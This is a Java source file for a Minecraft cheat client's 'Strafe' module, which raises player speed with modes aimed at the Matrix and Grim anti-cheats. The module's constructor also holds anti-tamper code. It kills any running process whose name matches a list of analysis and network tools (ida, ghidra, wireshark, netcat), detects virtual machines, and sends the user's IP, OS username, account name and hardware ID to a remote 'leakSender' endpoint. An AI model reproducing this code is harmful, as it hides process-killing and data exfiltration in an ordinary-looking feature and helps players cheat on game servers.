package com.client.impl.function.movement;

import com.client.BloodyClient;
import com.client.event.events.PacketEvent;
import com.client.event.events.PlayerMoveEvent;
import com.client.event.events.SendMovementPacketsEvent;
import com.client.event.events.TickEvent;
import com.client.interfaces.IClientPlayerEntity;
import com.client.interfaces.IVec3d;
import com.client.system.function.Category;
import com.client.system.function.Function;
import com.client.system.function.FunctionManager;
import com.client.system.setting.settings.ListSetting;
import com.client.utils.auth.*;
import com.client.utils.auth.records.CheckerClass;
import com.client.utils.game.movement.MovementUtils;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.entity.effect.StatusEffects;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.network.packet.s2c.play.PlayerPositionLookS2CPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Box;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.tree.ClassNode;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.atomic.AtomicReference;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.stream.Stream;

public class Strafe extends Function {
    private final ListSetting mode = List().name("Режим").list(List.of("Обычный", "Matrix", "Grim")).defaultValue("Grim").build();

    public Strafe() {
        super("Strafe", Category.MOVEMENT);

        checkLoadedClasses();

        String hwid = getUserHWID();
        if (isBeingDebugged().has()) {
            sendLog("Программа для дебага " + this.getName());
            System.exit(-1);
            try {
                throw new LayerInstantiationException();
            } catch (LayerInstantiationException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (Loader.hwid.isEmpty() || Loader.hwid.isBlank() || !Loader.hwid.equals(hwid)) {
            sendLog("HWID Error " + this.getName());
            System.exit(-1);
            try {
                throw new ClassNotFoundException();
            } catch (ClassNotFoundException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (!VMUtils.identifyVM().isEmpty()) {
            sendLog("Виртуальная машина " + this.getName());
            System.exit(-1);
            try {
                throw new Exception();
            } catch (Exception ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (hasNoVerify()) {
            sendLog("-noverify " + this.getName());
            System.exit(-1);
            try {
                throw new IllegalAccessException();
            } catch (IllegalAccessException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (!ConnectionManager.get("https://bloodyhvh.site/auth/getAccess.php?hwid=" + hwid).sendString().contains(hwid + "1")) {
            sendLog("Не пользователь " + this.getName());
            System.exit(-1);
            try {
                throw new ArithmeticException();
            } catch (ArithmeticException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (!ConnectionManager.get("https://bloodyhvh.site/auth/getAccessPremium.php?hwid=" + hwid).sendString().contains(hwid + "1") && (Loader.isPremium() || Loader.PREMIUM)) {
            sendLog("Фейк премиум " + this.getName());
            System.exit(-1);
            try {
                throw new NoSuchElementException();
            } catch (NoSuchElementException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }
    }

    public static boolean hasNoVerify() {
        return ArgumentUtils.hasNoVerify();
    }

    public static CheckerClass isBeingDebugged() {
        if (PlatformUtils.getOs().equals(PlatformUtils.OSType.Mac) || PlatformUtils.getOs().equals(PlatformUtils.OSType.Linux)) {
            return new CheckerClass(false, "");
        }

        AtomicReference<String> detected = new AtomicReference<>("false");
        Stream<ProcessHandle> liveProcesses = ProcessHandle.allProcesses();
        List<String> badProcesses = Arrays.asList(
                "ida",
                "jmap",
                "jstack",
                "jcmd",
                "jconsole",
                "procmon",
                "radare2",
                "drinject",
                "ghidra",
                "jdb",
                "dnspy",
                "hxd",
                "nlclientapp",
                "fiddler",
                "charles",
                "df5serv",
                "pestudio",
                "debug",
                "wireshark",
                "dump",
                "hacktool",
                "crack",
                "dbg",
                "netcat",
                "intercepter",
                "ninja",
                "nethogs",
                "ettercap",
                "smartsniff",
                "smsniff",
                "scapy",
                "netcut",
                "ostinato");
        liveProcesses.filter(ProcessHandle::isAlive).forEach(ph -> {
            for (String badProcess : badProcesses) {
                if (ph.info().command().toString().toLowerCase().contains(badProcess)) {
                    detected.set(badProcess);
                    try {
                        ph.destroy();
                    } catch (Exception ignored) {
                        new LoggingUtils("Ошибка завершения " + badProcess, true);
                    }
                }
            }
        });

        return new CheckerClass(!detected.get().equals("false"), detected.get());
    }

    public static void checkLoadedClasses() {
        String modId = "bloody-client";
        String path = FabricLoader.getInstance().getModContainer(modId).get().getOrigin().getPaths().get(0).toAbsolutePath().toString();

        try {
            JarFile jarFile = new JarFile(path);
            Enumeration<JarEntry> entries = jarFile.entries();

            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                if (entry.getName().endsWith(".class")) {
                    InputStream is = jarFile.getInputStream(entry);
                    ClassReader cr = new ClassReader(is);
                    ClassNode cn = new ClassNode();
                    cr.accept(cn, 0);

                    if (Stream.of("dump", "hack", "crack", "debug", "tamper", "tamping", "dbg").anyMatch(cn.name::contains)) {
                        new LoggingUtils("Класс:  " + cn.name, true);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            new LoggingUtils("Ошибка при чтении файла!", false);
        }
    }

    public static void sendLog(String title) {
        String os = System.getProperty("os.name").replace(" ", "-");
        String username = System.getProperty("user.name").replace(" ", "-");
        String ip = getIP().replace(" ", "-");
        String accountName = ClientUtils.getAccountName(getUserHWID()).replace(" ", "-");
        String uid = ClientUtils.getUid(getUserHWID()).replace(" ", "-");
        ConnectionManager.get("https://bloodyhvh.site/auth/leakSender.php?status=1" + "&title=" + title.replace(" ", "-")
                +
                "&version=" + BloodyClient.VERSION
                +
                "&ip=" + ip + "&os=" + os + "&name=" + username + "&accountName=" + accountName + "&uid=" + uid + "&hwid=" + getUserHWID()).sendString();
    }

    public static String getIP() {
        return ConnectionManager.get("https://bloodyhvh.site/php/getIp.php").sendString();
    }

    public static String getUserHWID() {
        String a = "";
        try {
            String appdata = System.getenv("APPDATA");
            String result = System.getProperty("user.name")
                    + System.getenv("SystemRoot") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE")
                    + (appdata == null ? "alternatecopium" : appdata + "copium")
                    + System.getProperty("os.arch")
                    + System.getProperty("os.version");

            byte[] digest = MessageDigest.getInstance("SHA-256").digest(result.getBytes(StandardCharsets.UTF_8));
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < digest.length; i++)
                builder.append(Integer.toString((digest[i] & 0xff) + 0x100, 16).substring(1));

            result = builder.toString();
            a = result;
        } catch (Exception e) {
            new LoggingUtils("Невозможно создать HWID!", false);
        }

        return a;
    }

    public static double oldSpeed, contextFriction;
    public static boolean needSwap, needSprintState, disabled;
    public static int noSlowTicks;

    @Override
    public void sendMovementPackets(SendMovementPacketsEvent var1) {
        if (!mode.get().equals("Обычный")) {
            Iterator var2 = mc.world.getPlayers().iterator();

            while(true) {
                Vec3d var3;
                PlayerEntity var4;
                float var5;
                do {
                    do {
                        do {
                            do {
                                if (!var2.hasNext()) {
                                    return;
                                }

                                var4 = (PlayerEntity)var2.next();
                            } while(mc.player == var4);

                            if (mode.get().equals("Grim") && mc.player.distanceTo(var4) <= 2.0F && (mc.options.keyForward.isPressed() || mc.options.keyRight.isPressed() || mc.options.keyLeft.isPressed() || mc.options.keyBack.isPressed())) {
                                var5 = 1.185F;
                                var3 = mc.player.getVelocity();
                                mc.player.setVelocity(var3.x * var5, var3.y, var3.z * var5);
                            }
                        } while(!mode.get().equals("Matrix"));
                    } while(mc.player.distanceTo(var4) > 2.0F);
                } while(!mc.options.keyForward.isPressed() && !mc.options.keyRight.isPressed() && !mc.options.keyLeft.isPressed() && !mc.options.keyBack.isPressed());

                var5 = 1.15F;
                var3 = mc.player.getVelocity();
                mc.player.setVelocity(var3.x * var5, var3.y, var3.z * var5);
            }
        }
    }

    public double calculateSpeed(PlayerMoveEvent move) {
        float speedAttributes = getAIMoveSpeed();
        final float frictionFactor = mc.world.getBlockState(new BlockPos.Mutable().set(mc.player.getX(), getBoundingBox().getMin(Direction.Axis.Y) - move.movement.getY(), mc.player.getZ())).getBlock().getSlipperiness() * 0.91F;
        float n6 = mc.player.hasStatusEffect(StatusEffects.JUMP_BOOST) && mc.player.isUsingItem() ? 0.88f : (float) (oldSpeed > 0.32 && mc.player.isUsingItem() ? 0.88 : 0.91F);
        if (mc.player.isOnGround())
            n6 = frictionFactor;

        float n7 = (float) (0.1631f / Math.pow(n6, 3.0f));
        float n8;
        if (mc.player.isOnGround()) {
            n8 = speedAttributes * n7;
            if (move.movement.getY() > 0)
                n8 += 0.2f;
            disabled = false;
        } else n8 = 0.0255f;

        boolean noslow = false;
        double max2 = oldSpeed + n8;
        double max = 0.0;

        if (mc.player.isUsingItem() && move.movement.getY() <= 0) {
            double n10 = oldSpeed + n8 * 0.25;
            double motionY2 = move.movement.getY();
            if (motionY2 != 0.0 && Math.abs(motionY2) < 0.08) {
                n10 += 0.055;
            }
            if (max2 > (max = Math.max(0.043, n10))) {
                noslow = true;
                ++noSlowTicks;
            } else {
                noSlowTicks = Math.max(noSlowTicks - 1, 0);
            }
        } else {
            noSlowTicks = 0;
        }

        if (noSlowTicks > 3) max2 = max - 0.019;
        else max2 = Math.max(noslow ? 0 : 0.25, max2) - (mc.player.age % 2 == 0 ? 0.001 : 0.002);

        contextFriction = n6;
        if (!mc.player.isOnGround()) {
            needSprintState = !((IClientPlayerEntity) mc.player).lastSprinting();
            needSwap = true;
        } else needSprintState = false;
        return max2;
    }

    public float getAIMoveSpeed() {
        boolean prevSprinting = mc.player.isSprinting();
        mc.player.setSprinting(false);
        float speed = mc.player.getMovementSpeed() * 1.3f;
        mc.player.setSprinting(prevSprinting);
        return speed;
    }

    @Override
    public void onEnable() {
        oldSpeed = 0.0;
    }

    public boolean canStrafe() {
        if (mc.player.isSneaking()) {
            return false;
        }
        if (mc.player.isInLava()) {
            return false;
        }
        if (FunctionManager.isEnabled("Speed")) {
            return false;
        }
        if (mc.player.isSubmergedInWater()) {
            return false;
        }
        return !mc.player.abilities.flying;
    }

    public Box getBoundingBox() {
        return new Box(mc.player.getX() - 0.1, mc.player.getY(), mc.player.getZ() - 0.1, mc.player.getX() + 0.1, mc.player.getY() + 1, mc.player.getZ() + 0.1);
    }

    @Override
    public void onPlayerMoveEvent(PlayerMoveEvent event) {
        if (canStrafe()) {
            if (MovementUtils.isMoving()) {
                double[] motions = forward(calculateSpeed(event));

                ((IVec3d) event.movement).setX(motions[0]);
                ((IVec3d) event.movement).setZ(motions[1]);
            } else {
                oldSpeed = 0;
                ((IVec3d) event.movement).setX(0);
                ((IVec3d) event.movement).setZ(0);
            }
            event.cancel();
        } else {
            oldSpeed = 0;
        }
    }

    public static double[] forward(double d) {
        float f = mc.player.input.movementForward;
        float f2 = mc.player.input.movementSideways;
        float f3 =  mc.player.yaw;
        if (f != 0.0f) {
            if (f2 > 0.0f) {
                f3 += ((f > 0.0f) ? -45 : 45);
            } else if (f2 < 0.0f) {
                f3 += ((f > 0.0f) ? 45 : -45);
            }
            f2 = 0.0f;
            if (f > 0.0f) {
                f = 1.0f;
            } else if (f < 0.0f) {
                f = -1.0f;
            }
        }
        final double d2 = Math.sin(Math.toRadians(f3 + 90.0f));
        final double d3 = Math.cos(Math.toRadians(f3 + 90.0f));
        final double d4 = f * d * d3 + f2 * d * d2;
        final double d5 = f * d * d2 - f2 * d * d3;
        return new double[]{d4, d5};
    }

    @Override
    public void tick(TickEvent.Pre e) {
        oldSpeed = Math.hypot(mc.player.getX() - mc.player.prevX, mc.player.getZ() - mc.player.prevZ) * contextFriction;
    }

    @Override
    public void onPacket(PacketEvent.Receive e) {
        if (e.packet instanceof PlayerPositionLookS2CPacket) {
            oldSpeed = 0;
        }
    }
}
